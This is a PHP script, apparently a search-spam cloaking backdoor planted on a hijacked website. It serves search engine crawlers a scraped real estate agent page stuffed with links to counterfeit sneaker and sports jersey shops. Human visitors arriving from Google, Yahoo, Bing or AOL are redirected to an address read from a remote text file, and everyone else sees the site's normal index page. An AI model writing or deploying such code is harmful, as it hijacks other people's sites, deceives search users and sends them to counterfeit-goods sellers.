<?php
error_reporting(E_ALL ^ E_NOTICE);
$jumpcode="http://link.2016online.com/en/max.txt.html";
$desurljiechi="https://www.remax.com/real-estate-agents/lily-bambas-lake-mary-fl/100027060";
$arrdom = explode('/',$desurljiechi);
for($dd=0;$dd<3;$dd++){
	$desurl = $desurl . $arrdom[$dd]. "/";
}

$shellurl="http://".$_SERVER["HTTP_HOST"].str_ireplace("index.php","",str_ireplace("?".$_SERVER["QUERY_STRING"],"",$_SERVER["REQUEST_URI"]))."?";

function is_spider(){
	$s_agent=$_SERVER["HTTP_USER_AGENT"];
	if(stripos($s_agent,"google")>0 || stripos($s_agent,"yahoo")>0 || stripos($s_agent,"bing")>0 || stripos($s_agent,"msnbot")>0 || stripos($s_agent,"alexa")>0 || stripos($s_agent,"ask")>0 || stripos($s_agent,"findlinks")>0 || stripos($s_agent,"altavista")>0 || stripos($s_agent,"baidu")>0 || stripos($s_agent,"inktomi")>0){
		return 1;
	}else{
		return 0;
	}
}

function IsUserSearch(){
	$s_ref=$_SERVER['HTTP_REFERER'];
	if(stripos($s_ref,"google")>0 || stripos($s_ref,"yahoo")>0 || stripos($s_ref,"bing")>0 || stripos($s_ref,"aol")>0){
		return true;
	}else{
		return false;
	}
}

$spider = is_spider();
$querystr = $_SERVER["QUERY_STRING"];
if($spider == 1 || $querystr == 'feiya'){
	
	if($querystr == 'feiya'){
		$querystr = '';
	}
	
	if($querystr == ''){
		$htmls = @file_get_contents($desurljiechi.$querystr);
	}else{
		$htmls = @file_get_contents($desurl.$querystr);
	}
	
	$desurl_xie = str_ireplace("/","\/",$desurl);
	$htmls = preg_replace('/href\s*=\s*(["\'])'.$desurl_xie.'/i','href=$1'.$shellurl,$htmls);
	$desurl1 = preg_replace("/\/$/","",$desurl);
	$desurl1_xie = str_ireplace("/","\/",$desurl1);
	$htmls = preg_replace('/href\s*=\s*(["\'])'.$desurl1_xie.'/i','href=$1'.$shellurl,$htmls);
	$htmls = preg_replace('/href\s*=\s*(["\'])\//i','href=$1'.$shellurl,$htmls);
	$htmls = preg_replace('/href\s*=\s*(["\'])(?!http)/i','href=$1'.$shellurl,$htmls);
	
	$htmls = preg_replace('/src\s*=\s*(["\'])'.$desurl_xie.'/i','src=$1'.$shellurl,$htmls);
	$htmls = preg_replace('/src\s*=\s*(["\'])\//i','src=$1'.$shellurl,$htmls);
	$htmls = preg_replace('/src\s*=\s*(["\'])(?!http)/i','src=$1'.$shellurl,$htmls);
	$htmls = preg_replace('/url\((["\'])\//i','url($1'.$shellurl,$htmls);

	$desurl2 = str_ireplace("http://www.","",$desurl1);
	$desurl2 = str_ireplace("http://","",$desurl2);
	$htmls = str_ireplace($desurl2,$_SERVER["HTTP_HOST"],$htmls);
	
	$shellurl_xie = str_ireplace("/","\/",$shellurl);
	$htmls = preg_replace('/href\s*=\s*(["\'])'.$shellurl_xie.'\?(.*\.css)/i','href=$1'.$desurl.'$2',$htmls);
	$htmls = preg_replace('/href\s*=\s*(["\'])'.$shellurl_xie.'\?(.*\.ico)/i','href=$1'.$desurl.'$2',$htmls);
	
	$htmls = preg_replace('/src\s*=\s*(["\'])'.$shellurl_xie.'\?/i','src=$1'.$desurl,$htmls);
	
	$shellurlrm =  $shellurl;
	$shellurlrm=str_replace("?","",$shellurlrm);
	$shellurlrm_xie = str_ireplace("/","\/",$shellurlrm);
	$htmls = preg_replace('/'.$shellurlrm_xie.'\?(["\'])/i',$shellurlrm.'$1',$htmls);
	
	$htmls =  str_replace('window.location.href','var jp',$htmls);
	$htmls =  str_replace('location.href',';var jp',$htmls);
   $linkstr = '<div>Friendly Link <br> <br><a href=""https://www.winbasketballs.com/"">Nike LeBron 16 XVI Shoes</a><br><a href=""https://www.nicemaxshoes.com/"">Nike Air Max Dlx 2019</a><br><a href=""https://www.adjerseysmall.com/"">LeBron James Jersey Replica</a><br><a href=""https://www.2021selladidas.com/"">Yeezy Boost</a><br><a href=""https://www.myjerseysworld.com/"">Cheap Jerseys Outlet</a><br><a href=""https://www.thenicesneaker.com/"">Nike Air Max Women Sale</a><br><a href=""https://www.cheapjerseystime.com/"">Cheap Soccer Jerseys</a><br><a href=""https://www.ainhockeyjerseys.com/"">Wholesale NFL Jerseys China Online</a><br><a href=""https://www.vipjerseymlb.com/"">Authentic MLB Jerseys China</a><br><a href=""https://www.picksoccershoes.com/"">picksoccershoes.com</a>';
   $linkstr = str_replace('""', '"' , $linkstr);
	if(strstr(strtolower($htmls),'</body>')){
	    $htmls = preg_replace('/<\/body>/i',$linkstr.'</div></body>',$htmls,1);
	}else{
	    $htmls = $htmls . $linkstr . '</div>';
	}
	echo $htmls;
	exit;
}else{
	if(IsUserSearch()){
		if(stripos($jumpcode,".txt")>0){
			$jumpcode = @file_get_contents($jumpcode);
			$tiaoarray = explode('?',$jumpcode);
			if(isset($tiaoarray[0])){
				header("Location: $tiaoarray[0]?$shellurl");
			}else{
				header("Location: $jumpcode?$shellurl");
			}
			exit;
		}
	}
}
include 'index.php';
?>
